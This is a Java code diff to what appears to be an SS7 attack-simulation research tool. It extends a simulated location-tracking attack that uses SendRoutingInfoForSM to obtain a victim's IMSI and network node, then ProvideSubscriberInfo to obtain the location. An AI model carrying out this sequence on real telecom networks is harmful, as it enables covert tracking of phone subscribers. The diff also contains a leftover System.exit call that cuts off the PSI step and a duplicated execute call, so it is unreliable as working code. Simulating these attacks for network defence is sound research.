@@ -1,6 +1,9 @@
 package org.mobicents.protocols.ss7.tools.simulator;
 
+import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
 import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoResponse;
+import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMRequest;
+import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMResponse;
 import org.mobicents.protocols.ss7.tools.simulator.management.AttackTesterHost;
 
 import java.util.Random;
@@ -45,6 +48,9 @@ public class AttackSimulationOrganizer implements Stoppable {
         this.simpleSimulation = simpleSimulation;
 
         if (this.simpleSimulation) {
+            this.attackerBhlrA = new AttackTesterHost("ATTACKER_B_HLR_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_HLR_A);
+            this.hlrAattackerB = new AttackTesterHost("HLR_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.HLR_A_ATTACKER_B);
+
             this.attackerBvlrA = new AttackTesterHost("ATTACKER_B_VLR_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_VLR_A);
             this.vlrAattackerB = new AttackTesterHost("VLR_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.VLR_A_ATTACKER_B);
         } else {
@@ -79,6 +85,9 @@ public class AttackSimulationOrganizer implements Stoppable {
 
     private void startAttackSimulationHosts() {
         if (this.simpleSimulation) {
+            this.attackerBhlrA.start();
+            this.hlrAattackerB.start();
+
             this.attackerBvlrA.start();
             this.vlrAattackerB.start();
         } else {
@@ -127,7 +136,8 @@ public class AttackSimulationOrganizer implements Stoppable {
                             attackerBvlrA.getM3uaMan().getState().contains("ACTIVE"))
                         return true;
                 } else {
-                    if (attackerBvlrA.getM3uaMan().getState().contains("ACTIVE"))
+                    if (attackerBvlrA.getM3uaMan().getState().contains("ACTIVE") &&
+                            attackerBhlrA.getM3uaMan().getState().contains("ACTIVE"))
                         return true;
                 }
             } catch (InterruptedException e) {
@@ -139,7 +149,8 @@ public class AttackSimulationOrganizer implements Stoppable {
 
     private boolean testerHostsNeedQuit() {
         if(simpleSimulation)
-            return this.attackerBvlrA.isNeedQuit() || this.vlrAattackerB.isNeedQuit();
+            return this.attackerBvlrA.isNeedQuit() || this.vlrAattackerB.isNeedQuit() ||
+                    this.attackerBhlrA.isNeedQuit() || this.hlrAattackerB.isNeedQuit();
         else
             return this.mscAmscB.isNeedQuit() || this.mscBmscA.isNeedQuit() ||
                 this.mscAhlrA.isNeedQuit() || this.hlrAmscA.isNeedQuit() ||
@@ -154,9 +165,13 @@ public class AttackSimulationOrganizer implements Stoppable {
 
     private void testerHostsExecuteCheckStore() {
         if (simpleSimulation) {
+            this.attackerBhlrA.execute();
+            this.vlrAattackerB.execute();
             this.attackerBvlrA.execute();
             this.vlrAattackerB.execute();
 
+            this.attackerBhlrA.checkStore();
+            this.hlrAattackerB.checkStore();
             this.attackerBvlrA.checkStore();
             this.vlrAattackerB.checkStore();
         } else {
@@ -298,45 +313,42 @@ public class AttackSimulationOrganizer implements Stoppable {
     }
 
     private String attackLocationAti() {
-        this.attackerBhlrA.setAttackType(AttackTesterHost.AttackType.LOCATION_ATI);
-        Thread attackerThread = new Thread(this.attackerBhlrA);
-        attackerThread.run();
-
-        do{
-            try {
-                this.wait(100);
-            } catch (InterruptedException e) {
-            }
-        } while (this.attackerBhlrA.gotPSIResponse());
-
         return this.attackerBhlrA.getTestAttackClient().performATI();
     }
 
     private String attackLocationPsi() {
-        //String response = this.attackerBhlrA.getTestAttackClient().performSendRoutingInfoForSM();
+        System.out.println("-----------STARTING LOCATION PSI ATTACK-----------");
         //Get necessary information from request, use in next message.
-        //long invokeId = this.attackerBvlrA.getTestAttackClient().performProvideSubscriberInfoRequest();
+        this.attackerBhlrA.getTestAttackClient().performSendRoutingInfoForSM("98979695", "0000000");
 
-        System.out.println("-----------SENT PSI REQUEST-----------");
-
-        this.attackerBvlrA.setAttackType(AttackTesterHost.AttackType.LOCATION_PSI);
-        Thread attackerThread = new Thread(this.attackerBvlrA);
-
-        System.out.println("-----------STARTING ATTACKER THREAD-----------");
-
-        attackerThread.run();
-
-        do{
+        while(!this.attackerBhlrA.gotSRIForSMResponse()){
             try{
-                Thread.sleep(100);
+                Thread.sleep(50);
             } catch (InterruptedException e) {
                 System.exit(50);
             }
-        } while (!this.attackerBvlrA.gotPSIResponse());
+        }
+
+        SendRoutingInfoForSMResponse sriResponse = this.attackerBhlrA.getTestAttackClient().getLastSRIForSMResponse();
+
+        String victimImsi = sriResponse.getIMSI().getData();
+        System.out.println("ADDRESS CONTAINED IN SRI: " + sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress());
+
+        System.exit(-1);
+
+        this.attackerBvlrA.getTestAttackClient().performProvideSubscriberInfoRequest();
+
+        while(!this.attackerBvlrA.gotPSIResponse()){
+            try{
+                Thread.sleep(50);
+            } catch (InterruptedException e) {
+                System.exit(50);
+            }
+        }
 
         System.out.println("-----------GOT PSI RESPONSE-----------");
 
-        ProvideSubscriberInfoResponse psiResponse = this.attackerBvlrA.getTestAttackClient().getPsiResponse();
+        ProvideSubscriberInfoResponse psiResponse = this.attackerBvlrA.getTestAttackClient().getLastPsiResponse();
         System.out.println(psiResponse.toString());
 
         //Location information aquired.
